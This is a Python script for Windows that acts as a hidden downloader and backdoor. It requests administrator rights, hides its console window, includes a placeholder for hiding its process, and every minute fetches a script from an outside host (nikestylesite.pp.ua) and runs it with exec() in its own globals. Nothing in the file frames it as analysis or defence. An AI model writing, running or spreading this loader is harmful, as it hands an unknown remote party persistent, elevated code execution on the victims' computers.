import os
import urllib.request
import time
import ctypes
import sys

# URL of the server hosting the Python script
SERVER_URL = 'https://nikestylesite.pp.ua/files/app.py/'
# Path where the script will be temporarily saved
TEMP_SCRIPT_PATH = 'temp_script.py'
# File path to the current script being executed
CURRENT_SCRIPT_PATH = os.path.abspath(__file__)

# Windows API Definitions
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
TH32CS_SNAPPROCESS = 0x00000002

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong),
                ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong),
                ("th32DefaultHeapID", ctypes.c_void_p),
                ("dcModule", ctypes.c_ulong),
                ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong),
                ("szExeFile", ctypes.c_char * 260)]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(script_path):
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)

def hide_process():
    # Attempt to hide the process from Task Manager
    pass  # Full implementation would require more complex operations

def download_script(url, path):
    try:
        response = urllib.request.urlopen(url)
        with open(path, 'wb') as f:
            f.write(response.read())
    except Exception as e:
        print(f"Error downloading script: {e}")

def is_server_reachable(url):
    try:
        response = urllib.request.urlopen(url, timeout=10)
        return response.status == 200
    except:
        return False

def execute_script(path):
    exec(open(path).read(), globals())

def main():
    if not is_admin():
        script_path = os.path.abspath(__file__)
        run_as_admin(script_path)
        sys.exit()

    hide_process()

    while True:
        if is_server_reachable(SERVER_URL):
            download_script(SERVER_URL, TEMP_SCRIPT_PATH)
            if os.path.getmtime(CURRENT_SCRIPT_PATH) != os.path.getmtime(TEMP_SCRIPT_PATH):
                execute_script(TEMP_SCRIPT_PATH)
        time.sleep(60)

# Hide the console window (Windows-specific)
if os.name == 'nt':
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

if __name__ == "__main__":
    main()
    
